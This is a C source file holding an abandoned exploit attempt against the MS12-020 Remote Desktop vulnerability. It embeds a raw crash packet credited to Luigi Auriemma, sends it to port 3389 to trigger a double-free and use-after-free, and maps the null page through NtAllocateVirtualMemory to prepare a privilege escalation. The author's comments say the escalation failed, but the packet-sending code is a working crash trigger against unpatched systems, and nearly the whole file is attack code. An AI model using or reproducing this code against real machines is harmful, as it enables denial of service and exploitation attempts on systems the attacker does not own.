// This exploit was abandoned because I realized that I am not interacting with the driver directly.
// Instead, I send a packet to the server and let svchost.exe handle it (as only users under the NT AUTHORITY group can interact with the driver).
// I really, REALLY wish I realized this sooner.

#pragma warning (disable : 4996)

#define EXPLOIT_TARGET_PORT 3389
#define EXPLOIT_PACKET_COUNT 1

#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>

typedef NTSYSCALLAPI NTSTATUS(WINAPI* NtAllocateVirtualMemory)(
	HANDLE hProcessHandle,
	PVOID* pBaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T pRegionSize,
	ULONG AllocationType,
	ULONG Protect
	);

// The raw packet data provided by Luigi Auriemma.
// If you want to analyze this, do not use a disassembler like what the people at ifconfig.dk did (https://ifconfig.dk/ms12-020/); this is not assembly code.
// Instead, try loading the packet data in some network analysis utility like Wireshark.
//
// No shade by the way, they seem to create cool blogs.
unsigned char g_pPacketData[] =
{
	0x03, 0x00, 0x00, 0x13, 0x0E, 0xE0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
	0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x01, 0xD6, 0x02,
	0xF0, 0x80, 0x7F, 0x65, 0x82, 0x01, 0x94, 0x04, 0x01, 0x01, 0x04, 0x01,
	0x01, 0x01, 0x01, 0xFF, 0x30, 0x19, 0x02, 0x04, 0x00, 0x00, 0x00, 0x00,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x02, 0x02, 0x04, 0x00, 0x00, 0x00, 0x00,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0x00, 0x00, 0x00, 0x00,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x01, 0x02, 0x02, 0xFF, 0xFF, 0x02, 0x04,
	0x00, 0x00, 0x00, 0x02, 0x30, 0x19, 0x02, 0x04, 0x00, 0x00, 0x00, 0x01,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0x00, 0x00, 0x00, 0x01,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0x00, 0x00, 0x00, 0x00,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x01, 0x02, 0x02, 0x04, 0x20, 0x02, 0x04,
	0x00, 0x00, 0x00, 0x02, 0x30, 0x1C, 0x02, 0x02, 0xFF, 0xFF, 0x02, 0x02,
	0xFC, 0x17, 0x02, 0x02, 0xFF, 0xFF, 0x02, 0x04, 0x00, 0x00, 0x00, 0x01,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x00, 0x02, 0x04, 0x00, 0x00, 0x00, 0x01,
	0x02, 0x02, 0xFF, 0xFF, 0x02, 0x04, 0x00, 0x00, 0x00, 0x02, 0x04, 0x82,
	0x01, 0x33, 0x00, 0x05, 0x00, 0x14, 0x7C, 0x00, 0x01, 0x81, 0x2A, 0x00,
	0x08, 0x00, 0x10, 0x00, 0x01, 0xC0, 0x00, 0x44, 0x75, 0x63, 0x61, 0x81,
	0x1C, 0x01, 0xC0, 0xD8, 0x00, 0x04, 0x00, 0x08, 0x00, 0x80, 0x02, 0xE0,
	0x01, 0x01, 0xCA, 0x03, 0xAA, 0x09, 0x04, 0x00, 0x00, 0xCE, 0x0E, 0x00,
	0x00, 0x48, 0x00, 0x4F, 0x00, 0x53, 0x00, 0x54, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x01, 0xCA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x07,
	0x00, 0x01, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30,
	0x00, 0x2D, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x2D, 0x00, 0x30,
	0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30,
	0x00, 0x2D, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x04, 0xC0, 0x0C, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x02, 0xC0, 0x0C, 0x00, 0x1B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x03, 0xC0, 0x2C, 0x00, 0x03, 0x00, 0x00, 0x00, 0x72, 0x64, 0x70,
	0x64, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x80, 0x63, 0x6C, 0x69,
	0x70, 0x72, 0x64, 0x72, 0x00, 0x00, 0x00, 0xA0, 0xC0, 0x72, 0x64, 0x70,
	0x73, 0x6E, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x03, 0x00, 0x00,
	0x0C, 0x02, 0xF0, 0x80, 0x04, 0x01, 0x00, 0x01, 0x00, 0x03, 0x00, 0x00,
	0x08, 0x02, 0xF0, 0x80, 0x28, 0x03, 0x00, 0x00, 0x0C, 0x02, 0xF0, 0x80,
	0x38, 0x00, 0x06, 0x03, 0xEF, 0x03, 0x00, 0x00, 0x0C, 0x02, 0xF0, 0x80,
	0x38, 0x00, 0x06, 0x03, 0xEB, 0x03, 0x00, 0x00, 0x0C, 0x02, 0xF0, 0x80,
	0x38, 0x00, 0x06, 0x03, 0xEC, 0x03, 0x00, 0x00, 0x0C, 0x02, 0xF0, 0x80,
	0x38, 0x00, 0x06, 0x03, 0xED, 0x03, 0x00, 0x00, 0x0C, 0x02, 0xF0, 0x80,
	0x38, 0x00, 0x06, 0x03, 0xEE
};

unsigned char TriggerUAF(void)
{
	SOCKET Socket = INVALID_SOCKET;

	struct hostent* pHost = 0;
	unsigned char* pIP = 0;
	struct sockaddr_in SocketAddress = { 0 };

	pHost = gethostbyname("");
	if (!pHost)
	{
		return 1;
	}

	pIP = inet_ntoa(**(struct in_addr**)pHost->h_addr_list);
	if (!pIP)
	{
		return 1;
	}

	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (!Socket)
	{
		return 1;
	}

	SocketAddress.sin_family = AF_INET;
	SocketAddress.sin_addr.s_addr = inet_addr(pIP);
	SocketAddress.sin_port = htons(EXPLOIT_TARGET_PORT);
	if (connect(Socket, (const struct sockaddr*)&SocketAddress, sizeof(SocketAddress)))
	{
		return 1;
	}
	Sleep(1000);

	if (send(Socket, g_pPacketData, sizeof(g_pPacketData), 0) == SOCKET_ERROR)
	{
		return 1;
	}

	return 0;
}

int main(int argc, char** argv)
{
	UNREFERENCED_PARAMETER(argc);
	UNREFERENCED_PARAMETER(argv);

	WSADATA WinsockData = { 0 };

	HMODULE hNTDLL = 0;
	NtAllocateVirtualMemory pNtAllocateVirtualMemory = 0;

	NTSTATUS Status = 0;
	PVOID pBaseAddress = (PVOID)1;
	SIZE_T RegionSize = 4096;

	// Initialization
	if (WSAStartup(MAKEWORD(2, 2), &WinsockData))
	{
		return 1;
	}

	// Prepare the null page
	hNTDLL = LoadLibraryA("C:\\Windows\\System32\\ntdll.dll");
	if (!hNTDLL)
	{
		return 1;
	}

	pNtAllocateVirtualMemory = (NtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
	if (!pNtAllocateVirtualMemory)
	{
		return 1;
	}

	Status = pNtAllocateVirtualMemory(GetCurrentProcess(), &pBaseAddress, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (Status < 0)
	{
		return 1;
	}

	*(void**)(0) = (void*)0x4141414141414141;
	printf("[>] Ready?");
	getchar();

	// Trigger the double-free (which leads to a use-after-free (which leads to a null pointer dereference (which leads to me losing my sanity)))
	for (unsigned long long i = 0; i < EXPLOIT_PACKET_COUNT; i++)
	{
		TriggerUAF();
	}

	printf("[*] Sleeping for 5000ms to ensure the packets went through...\n");
	Sleep(5000);

	WSACleanup();

	// TEMP
	printf("failed...");
	getchar();
	// TEMP
	return 0;
}